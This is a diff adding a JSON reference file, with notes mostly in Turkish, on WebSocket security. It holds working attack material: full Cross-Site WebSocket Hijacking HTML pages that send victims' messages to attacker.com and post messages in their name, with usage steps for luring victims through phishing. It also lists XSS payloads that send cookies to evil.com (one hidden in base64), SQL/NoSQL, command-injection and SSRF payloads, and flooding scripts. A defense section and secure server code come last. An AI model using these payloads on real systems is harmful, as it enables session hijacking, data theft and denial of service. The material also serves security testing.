@@ -1,0 +1,426 @@
+{
+  "websocket_basics": {
+    "desc": "WebSocket temel bilgileri",
+    "category": "WebSocket",
+    "type": "Basics",
+    "risk": "Info",
+    "protocol": {
+      "desc": "WebSocket full-duplex, persistent bağlantı sağlar",
+      "upgrade": "HTTP -> WebSocket upgrade with handshake",
+      "url_schemes": {
+        "ws": "ws://example.com/socket (non-encrypted)",
+        "wss": "wss://example.com/socket (TLS encrypted)"
+      }
+    },
+    "handshake": {
+      "client_request": "GET /chat HTTP/1.1\nHost: victim.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nOrigin: https://victim.com",
+      "server_response": "HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo="
+    }
+  },
+
+  "websocket_csrf_cswsh": {
+    "desc": "Cross-Site WebSocket Hijacking (CSWSH) - WebSocket CSRF",
+    "category": "WebSocket",
+    "type": "CSWSH",
+    "risk": "Critical",
+    "vulnerability": {
+      "desc": "WebSocket handshake'te Origin header validate edilmiyor",
+      "impact": "Attacker cross-origin WebSocket bağlantısı açıp kurbanın mesajlarını okuyabilir"
+    },
+    "detection": {
+      "check": "WebSocket handshake sırasında Origin header kontrolü var mı?",
+      "test": "Origin: https://evil.com ile WebSocket bağlantısı kur, başarılı olursa vulnerable"
+    },
+    "exploitation": {
+      "html_poc": "<!DOCTYPE html>\n<html>\n<head><title>CSWSH Attack</title></head>\n<body>\n<h1>Cross-Site WebSocket Hijacking</h1>\n<div id=\"messages\"></div>\n\n<script>\n// Victim browser'ında çalışan kod\nconst ws = new WebSocket('wss://victim.com/chat');\n\nws.onopen = function() {\n  console.log('WebSocket connection opened!');\n  // Victim'in authenticated session cookie'si otomatik gönderilir\n};\n\nws.onmessage = function(event) {\n  console.log('Message received:', event.data);\n  \n  // Victim'in aldığı mesajları attacker sunucusuna exfiltrate et\n  fetch('https://attacker.com/steal', {\n    method: 'POST',\n    body: JSON.stringify({\n      message: event.data,\n      timestamp: new Date().toISOString()\n    })\n  });\n  \n  // UI'da göster\n  document.getElementById('messages').innerHTML += \n    '<p>' + event.data + '</p>';\n};\n\n// Victim adına mesaj gönder\nws.send(JSON.stringify({\n  action: 'sendMessage',\n  to: 'admin',\n  message: 'Please reset my password to: hacked123'\n}));\n</script>\n</body>\n</html>",
+      "attack_flow": "1. Victim evil.com'a girer\n2. evil.com victim.com'a WebSocket bağlantısı açar\n3. Victim'in cookie'si ile authenticated connection\n4. Attacker victim'in mesajlarını okuyabilir ve mesaj gönderebilir"
+    }
+  },
+
+  "websocket_message_manipulation": {
+    "desc": "WebSocket mesaj manipülasyonu",
+    "category": "WebSocket",
+    "type": "Message Manipulation",
+    "risk": "High",
+    "attacks": [
+      {
+        "name": "Message injection",
+        "desc": "WebSocket mesajlarına payload inject etme",
+        "payloads": {
+          "xss": "{\"message\": \"<script>alert(document.domain)</script>\"}",
+          "sqli": "{\"search\": \"' OR 1=1--\"}",
+          "command_injection": "{\"filename\": \"; whoami\"}"
+        }
+      },
+      {
+        "name": "Message replay attack",
+        "desc": "Önceki mesajları replay etme",
+        "scenario": "1. Transfer mesajını intercept et\n2. Mesajı tekrar gönder\n3. Birden fazla transfer yapılır",
+        "example": "{\"action\": \"transfer\", \"to\": \"attacker\", \"amount\": 1000}"
+      },
+      {
+        "name": "Frame injection",
+        "desc": "WebSocket frame'lere malicious data injection",
+        "tools": ["Burp Suite", "ws-harness", "wsrepl"]
+      }
+    ]
+  },
+
+  "websocket_authentication_bypass": {
+    "desc": "WebSocket authentication ve authorization bypass",
+    "category": "WebSocket",
+    "type": "Auth Bypass",
+    "risk": "Critical",
+    "vulnerabilities": [
+      {
+        "name": "Missing authentication",
+        "desc": "WebSocket bağlantısı authentication gerektirmiyor",
+        "test": "Cookie olmadan veya invalid token ile WebSocket bağlantısı kur",
+        "poc": "const ws = new WebSocket('wss://victim.com/admin-socket');\n// Hiç auth token göndermeden bağlan"
+      },
+      {
+        "name": "Session fixation",
+        "desc": "Attacker session ID inject eder, victim kullanır",
+        "exploitation": "1. Attacker session ID alır: SESSION123\n2. Victim'i ws://victim.com/socket?session=SESSION123 linkine yönlendirir\n3. Victim bağlanır, attacker aynı session ile dinler"
+      },
+      {
+        "name": "Authorization bypass",
+        "desc": "Authentication var ama authorization yok",
+        "test": "Normal user ile admin endpoint'e WebSocket bağlantısı kur",
+        "example": "// Normal user token ile\nconst ws = new WebSocket('wss://victim.com/admin-panel');\nws.send(JSON.stringify({action: 'deleteUser', userId: 123}));"
+      },
+      {
+        "name": "Token in URL",
+        "desc": "Auth token URL'de ise log'larda leak olur",
+        "vulnerable": "wss://victim.com/socket?token=SECRET_TOKEN",
+        "logs": "Server logs, proxy logs, browser history'de token görünür"
+      }
+    ]
+  },
+
+  "websocket_dos_attacks": {
+    "desc": "WebSocket DoS attacks",
+    "category": "WebSocket",
+    "type": "DoS",
+    "risk": "High",
+    "attacks": [
+      {
+        "name": "Connection exhaustion",
+        "desc": "Binlerce WebSocket bağlantısı açarak server'ı tüket",
+        "poc": "// JavaScript\nfor (let i = 0; i < 10000; i++) {\n  const ws = new WebSocket('wss://victim.com/socket');\n  // Bağlantıyı aç ama kapatma\n}"
+      },
+      {
+        "name": "Message flooding",
+        "desc": "Saniyede binlerce mesaj göndererek server'ı tüket",
+        "poc": "const ws = new WebSocket('wss://victim.com/chat');\nws.onopen = function() {\n  setInterval(() => {\n    ws.send(JSON.stringify({msg: 'A'.repeat(10000)}));\n  }, 1); // Her 1ms'de mesaj gönder\n};"
+      },
+      {
+        "name": "Large payload attack",
+        "desc": "Çok büyük mesajlar göndererek memory tüket",
+        "poc": "const hugePayload = 'A'.repeat(100 * 1024 * 1024); // 100MB\nws.send(hugePayload);"
+      },
+      {
+        "name": "Ping/Pong flood",
+        "desc": "Ping frame'lerini flood et",
+        "note": "Low-level WebSocket library gerekir (JavaScript'te built-in yok)"
+      }
+    ]
+  },
+
+  "websocket_information_disclosure": {
+    "desc": "WebSocket üzerinden bilgi sızdırma",
+    "category": "WebSocket",
+    "type": "Information Disclosure",
+    "risk": "High",
+    "scenarios": [
+      {
+        "name": "Sensitive data in messages",
+        "desc": "WebSocket mesajlarında sensitive data gönderiliyor",
+        "example": "{\"user\": \"admin\", \"password\": \"admin123\", \"ssn\": \"123-45-6789\"}"
+      },
+      {
+        "name": "Error messages",
+        "desc": "Verbose error messages internal bilgi sızdırıyor",
+        "example": "{\"error\": \"Database connection failed: mysql://root:pass@10.0.0.5:3306/db\"}"
+      },
+      {
+        "name": "Broadcast to all users",
+        "desc": "Bir user'ın mesajı tüm user'lara broadcast ediliyor",
+        "impact": "Private mesajlar public oluyor"
+      },
+      {
+        "name": "Debug endpoints",
+        "desc": "Debug WebSocket endpoint'leri production'da açık",
+        "urls": [
+          "wss://victim.com/debug",
+          "wss://victim.com/ws-debug",
+          "wss://victim.com/admin-ws"
+        ]
+      }
+    ]
+  },
+
+  "websocket_tunnel_attacks": {
+    "desc": "WebSocket tunneling attacks",
+    "category": "WebSocket",
+    "type": "Tunneling",
+    "risk": "High",
+    "techniques": [
+      {
+        "name": "WebSocket to HTTP smuggling",
+        "desc": "WebSocket üzerinden HTTP request smuggle etme",
+        "payload": "ws.send('GET /admin HTTP/1.1\\r\\nHost: internal-server\\r\\n\\r\\n');"
+      },
+      {
+        "name": "Internal network access via WebSocket",
+        "desc": "WebSocket server internal network'e erişiyorsa proxy olarak kullan",
+        "exploitation": "// Victim browser'ında\nws.send(JSON.stringify({\n  action: 'fetch',\n  url: 'http://192.168.1.1/admin'\n}));\n\n// Server internal request yapar ve sonucu döner"
+      },
+      {
+        "name": "SSRF via WebSocket",
+        "desc": "WebSocket message handler SSRF'e açık",
+        "payloads": [
+          "{\"url\": \"http://169.254.169.254/latest/meta-data/\"}",
+          "{\"fetch\": \"http://localhost:6379/\"}",
+          "{\"proxy\": \"file:///etc/passwd\"}"
+        ]
+      }
+    ]
+  },
+
+  "websocket_xss_injection": {
+    "desc": "WebSocket üzerinden XSS injection",
+    "category": "WebSocket",
+    "type": "XSS",
+    "risk": "High",
+    "vulnerability": {
+      "desc": "WebSocket mesajları sanitize edilmeden DOM'a yazılıyor",
+      "scenario": "Real-time chat uygulaması WebSocket mesajlarını direkt innerHTML ile gösteriyor"
+    },
+    "exploitation": {
+      "payload": "ws.send(JSON.stringify({\n  message: '<img src=x onerror=alert(document.cookie)>'\n}));",
+      "advanced_payloads": [
+        "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
+        "<iframe src=javascript:alert(origin)>",
+        "<svg/onload=eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXZpbC5jb20vP2M9Jytkb2N1bWVudC5jb29raWUp'))>",
+        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"
+      ],
+      "impact": "Tüm chat user'larına XSS, stored XSS gibi davranır"
+    }
+  },
+
+  "websocket_sqli_nosqli": {
+    "desc": "WebSocket üzerinden SQL/NoSQL injection",
+    "category": "WebSocket",
+    "type": "Injection",
+    "risk": "Critical",
+    "sql_injection": {
+      "desc": "WebSocket mesaj parametreleri SQL query'de kullanılıyor",
+      "payloads": [
+        "{\"search\": \"' OR '1'='1\"}",
+        "{\"userId\": \"1' UNION SELECT password FROM users--\"}",
+        "{\"filter\": \"' OR 1=1--\"}"
+      ],
+      "test": "ws.send(JSON.stringify({search: \"' OR SLEEP(5)--\"}));\n// Response 5 saniye gecikirse SQLi var"
+    },
+    "nosql_injection": {
+      "desc": "MongoDB gibi NoSQL veritabanlarında injection",
+      "payloads": [
+        "{\"username\": {\"$ne\": null}}",
+        "{\"password\": {\"$gt\": \"\"}}",
+        "{\"userId\": {\"$regex\": \".*\"}}"
+      ]
+    }
+  },
+
+  "websocket_rate_limiting_bypass": {
+    "desc": "WebSocket rate limiting bypass",
+    "category": "WebSocket",
+    "type": "Rate Limit Bypass",
+    "risk": "Medium",
+    "techniques": [
+      {
+        "name": "Multiple connections",
+        "desc": "Rate limit connection başına ise birden fazla connection aç",
+        "poc": "const connections = [];\nfor (let i = 0; i < 100; i++) {\n  connections.push(new WebSocket('wss://victim.com/api'));\n}\n\n// Her connection'dan 10 request = toplam 1000 request"
+      },
+      {
+        "name": "Connection reuse",
+        "desc": "Bağlantıyı kapatıp tekrar açarak rate limit reset et",
+        "poc": "function sendFlood() {\n  const ws = new WebSocket('wss://victim.com/api');\n  ws.onopen = () => {\n    for (let i = 0; i < 100; i++) {\n      ws.send(JSON.stringify({action: 'brute'}));\n    }\n    ws.close();\n    setTimeout(sendFlood, 100); // Tekrar aç\n  };\n}"
+      }
+    ]
+  },
+
+  "websocket_subdomain_takeover": {
+    "desc": "WebSocket subdomain takeover",
+    "category": "WebSocket",
+    "type": "Subdomain Takeover",
+    "risk": "Critical",
+    "scenario": {
+      "desc": "App ws://old-chat.victim.com'a bağlanıyor ama subdomain unclaimed",
+      "exploitation": "1. old-chat.victim.com subdomain'i claim et\n2. Kendi WebSocket server'ını kur\n3. Victim app'ler senin server'ına bağlanır\n4. Mesajları intercept et ve manipüle et"
+    },
+    "detection": {
+      "check": "WebSocket URL'lerini inspect et, unclaimed subdomain var mı?",
+      "tools": ["subjack", "SubOver", "can-i-take-over-xyz"]
+    }
+  },
+
+  "websocket_testing_tools": {
+    "desc": "WebSocket security testing tools",
+    "category": "WebSocket",
+    "type": "Tools",
+    "tools": [
+      {
+        "name": "Burp Suite",
+        "desc": "WebSocket Proxy, history, repeater",
+        "usage": "Intercept WebSocket traffic, modify frames, replay"
+      },
+      {
+        "name": "wsrepl",
+        "desc": "WebSocket REPL for testing",
+        "install": "npm install -g wsrepl",
+        "usage": "wsrepl wss://victim.com/socket"
+      },
+      {
+        "name": "ws-harness",
+        "desc": "WebSocket manipulation tool",
+        "features": ["Frame injection", "Fuzzing", "Protocol testing"]
+      },
+      {
+        "name": "websocket-client (Python)",
+        "desc": "Python WebSocket client library",
+        "usage": "from websocket import create_connection\nws = create_connection('ws://victim.com/socket')\nws.send('test')\nprint(ws.recv())"
+      },
+      {
+        "name": "websocat",
+        "desc": "Command-line WebSocket client",
+        "install": "brew install websocat",
+        "usage": "websocat wss://victim.com/socket"
+      }
+    ]
+  },
+
+  "websocket_manual_testing": {
+    "desc": "WebSocket manual testing checklist",
+    "category": "WebSocket",
+    "type": "Testing Checklist",
+    "checklist": [
+      {
+        "test": "CSWSH - Cross-Site WebSocket Hijacking",
+        "steps": [
+          "Evil.com'dan victim.com WebSocket'e bağlan",
+          "Origin header validate ediliyor mu kontrol et",
+          "Bağlantı başarılı olursa CSWSH var"
+        ]
+      },
+      {
+        "test": "Authentication bypass",
+        "steps": [
+          "WebSocket bağlantısını auth token olmadan dene",
+          "Invalid/expired token ile dene",
+          "Token in URL -> logs'da leak kontrolü"
+        ]
+      },
+      {
+        "test": "Authorization bypass",
+        "steps": [
+          "Normal user ile admin endpoint'e bağlan",
+          "Farklı user'ın mesajlarını oku/değiştir",
+          "Privilege escalation mümkün mü?"
+        ]
+      },
+      {
+        "test": "Message injection attacks",
+        "steps": [
+          "XSS payloads gönder",
+          "SQLi payloads dene",
+          "Command injection payloads test et",
+          "SSRF payloads dene"
+        ]
+      },
+      {
+        "test": "Information disclosure",
+        "steps": [
+          "Error messages verbose mu?",
+          "Sensitive data mesajlarda var mı?",
+          "Debug endpoint'ler açık mı?"
+        ]
+      },
+      {
+        "test": "DoS attacks",
+        "steps": [
+          "Çok fazla connection aç",
+          "Büyük payloadlar gönder",
+          "Message flooding dene"
+        ]
+      },
+      {
+        "test": "Rate limiting",
+        "steps": [
+          "Rate limit var mı test et",
+          "Multiple connection ile bypass dene"
+        ]
+      }
+    ]
+  },
+
+  "websocket_exploitation_poc": {
+    "desc": "Full WebSocket exploitation PoC",
+    "category": "WebSocket",
+    "type": "Exploitation",
+    "cswsh_full_poc": "<!DOCTYPE html>\n<html>\n<head>\n  <title>WebSocket CSWSH Exploitation</title>\n  <style>\n    body { font-family: Arial; padding: 20px; }\n    #log { background: #f0f0f0; padding: 10px; height: 400px; overflow-y: auto; }\n    .message { margin: 5px 0; padding: 5px; background: white; }\n  </style>\n</head>\n<body>\n  <h1>Cross-Site WebSocket Hijacking Attack</h1>\n  <p>Victim'in WebSocket mesajları:</p>\n  <div id=\"log\"></div>\n  \n  <h3>Victim adına mesaj gönder:</h3>\n  <input type=\"text\" id=\"messageInput\" placeholder=\"Mesaj...\" style=\"width: 300px\">\n  <button onclick=\"sendMessage()\">Gönder</button>\n  \n  <script>\n  const VICTIM_WEBSOCKET = 'wss://victim.com/chat';\n  const EXFIL_SERVER = 'https://attacker.com/exfil';\n  \n  let ws;\n  \n  function log(message, type = 'info') {\n    const logDiv = document.getElementById('log');\n    const msgDiv = document.createElement('div');\n    msgDiv.className = 'message';\n    msgDiv.innerHTML = `<strong>[${type.toUpperCase()}]</strong> ${message}`;\n    logDiv.appendChild(msgDiv);\n    logDiv.scrollTop = logDiv.scrollHeight;\n  }\n  \n  function connectWebSocket() {\n    log('WebSocket bağlantısı kuruluyor...');\n    \n    ws = new WebSocket(VICTIM_WEBSOCKET);\n    \n    ws.onopen = function() {\n      log('WebSocket bağlantısı başarılı! Victim authenticated session ile bağlandık.', 'success');\n    };\n    \n    ws.onmessage = function(event) {\n      log('Mesaj alındı: ' + event.data, 'message');\n      \n      // Exfiltrate to attacker server\n      fetch(EXFIL_SERVER, {\n        method: 'POST',\n        headers: {'Content-Type': 'application/json'},\n        body: JSON.stringify({\n          type: 'websocket_message',\n          data: event.data,\n          timestamp: new Date().toISOString(),\n          victim_url: VICTIM_WEBSOCKET\n        })\n      }).catch(err => console.error('Exfil failed:', err));\n    };\n    \n    ws.onerror = function(error) {\n      log('WebSocket error: ' + error, 'error');\n    };\n    \n    ws.onclose = function() {\n      log('WebSocket bağlantısı kapandı', 'warning');\n      // Auto-reconnect\n      setTimeout(connectWebSocket, 2000);\n    };\n  }\n  \n  function sendMessage() {\n    const input = document.getElementById('messageInput');\n    const message = input.value;\n    \n    if (!message) {\n      alert('Mesaj giriniz!');\n      return;\n    }\n    \n    if (ws && ws.readyState === WebSocket.OPEN) {\n      ws.send(JSON.stringify({\n        action: 'sendMessage',\n        message: message,\n        timestamp: Date.now()\n      }));\n      log('Victim adına mesaj gönderildi: ' + message, 'sent');\n      input.value = '';\n    } else {\n      alert('WebSocket bağlantısı yok!');\n    }\n  }\n  \n  // Auto-connect on page load\n  window.onload = connectWebSocket;\n  </script>\n</body>\n</html>",
+    "usage": "1. Victim'i bu sayfaya yönlendir (phishing, XSS, etc.)\n2. Victim'in browser'ı victim.com WebSocket'e bağlanır\n3. Attacker victim'in mesajlarını okur ve mesaj gönderir"
+  },
+
+  "websocket_defense": {
+    "desc": "WebSocket güvenlik best practices",
+    "category": "WebSocket",
+    "type": "Defense",
+    "best_practices": [
+      {
+        "rule": "Origin header validation",
+        "implementation": "const allowedOrigins = ['https://victim.com', 'https://app.victim.com'];\nif (!allowedOrigins.includes(request.headers.origin)) {\n  return reject('Invalid origin');\n}",
+        "importance": "CSWSH saldırılarını önler"
+      },
+      {
+        "rule": "Authentication & authorization",
+        "implementation": "WebSocket handshake'te ve her mesajda auth token validate et",
+        "note": "Cookie + CSRF token veya Bearer token kullan"
+      },
+      {
+        "rule": "Input validation",
+        "implementation": "Tüm WebSocket mesajlarını validate et ve sanitize et",
+        "sanitize": "HTML encode, SQL escape, NoSQL escape"
+      },
+      {
+        "rule": "Rate limiting",
+        "implementation": "User/IP başına mesaj rate limit uygula",
+        "limits": "Örnek: 100 mesaj/dakika, 10 connection/IP"
+      },
+      {
+        "rule": "TLS kullan (WSS)",
+        "avoid": "ws://",
+        "use": "wss://",
+        "reason": "Man-in-the-middle saldırılarını önler"
+      },
+      {
+        "rule": "Message size limit",
+        "implementation": "Max message size: 1MB gibi",
+        "reason": "DoS ve memory exhaustion önlenir"
+      },
+      {
+        "rule": "Connection timeout",
+        "implementation": "Idle connection'ları 5 dakika sonra kapat",
+        "reason": "Connection exhaustion DoS önlenir"
+      },
+      {
+        "rule": "Error handling",
+        "avoid": "Verbose error messages (internal paths, SQL errors)",
+        "use": "Generic error messages"
+      }
+    ],
+    "secure_nodejs_implementation": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ noServer: true });\n\nconst allowedOrigins = ['https://victim.com'];\nconst MESSAGE_RATE_LIMIT = 100; // per minute\nconst MAX_MESSAGE_SIZE = 1024 * 1024; // 1MB\n\nserver.on('upgrade', (request, socket, head) => {\n  // 1. Origin validation\n  const origin = request.headers.origin;\n  if (!allowedOrigins.includes(origin)) {\n    socket.write('HTTP/1.1 403 Forbidden\\r\\n\\r\\n');\n    socket.destroy();\n    return;\n  }\n  \n  // 2. Authentication\n  const token = new URL(request.url, 'ws://localhost').searchParams.get('token');\n  if (!isValidToken(token)) {\n    socket.write('HTTP/1.1 401 Unauthorized\\r\\n\\r\\n');\n    socket.destroy();\n    return;\n  }\n  \n  wss.handleUpgrade(request, socket, head, (ws) => {\n    wss.emit('connection', ws, request, token);\n  });\n});\n\nwss.on('connection', (ws, request, token) => {\n  const userId = getUserIdFromToken(token);\n  let messageCount = 0;\n  let lastMinute = Date.now();\n  \n  ws.on('message', (message) => {\n    // 3. Rate limiting\n    if (Date.now() - lastMinute > 60000) {\n      messageCount = 0;\n      lastMinute = Date.now();\n    }\n    if (++messageCount > MESSAGE_RATE_LIMIT) {\n      ws.close(1008, 'Rate limit exceeded');\n      return;\n    }\n    \n    // 4. Message size limit\n    if (message.length > MAX_MESSAGE_SIZE) {\n      ws.close(1009, 'Message too large');\n      return;\n    }\n    \n    // 5. Input validation\n    let data;\n    try {\n      data = JSON.parse(message);\n    } catch (e) {\n      ws.send(JSON.stringify({error: 'Invalid message format'}));\n      return;\n    }\n    \n    // 6. Sanitize input\n    const sanitizedMessage = sanitizeHtml(data.message);\n    \n    // 7. Authorization check\n    if (data.action === 'admin' && !isAdmin(userId)) {\n      ws.send(JSON.stringify({error: 'Unauthorized'}));\n      return;\n    }\n    \n    // Process message...\n  });\n  \n  // 8. Connection timeout\n  const pingInterval = setInterval(() => {\n    if (ws.readyState === WebSocket.OPEN) {\n      ws.ping();\n    }\n  }, 30000);\n  \n  ws.on('close', () => {\n    clearInterval(pingInterval);\n  });\n});"
+  }
+}
